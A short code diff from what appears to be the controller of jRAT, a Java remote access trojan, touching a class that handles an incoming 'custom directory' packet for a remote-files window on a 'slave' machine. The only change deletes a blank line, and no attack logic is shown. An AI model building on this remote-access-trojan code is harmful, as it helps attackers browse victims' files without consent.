@@ -2,7 +2,6 @@ package io.jrat.controller.packets.incoming;
 
 import io.jrat.controller.Slave;
 import io.jrat.controller.ui.frames.FrameRemoteFiles;
-
 import java.io.DataInputStream;
 
 public class Packet34CustomDirectory extends AbstractIncomingPacket {
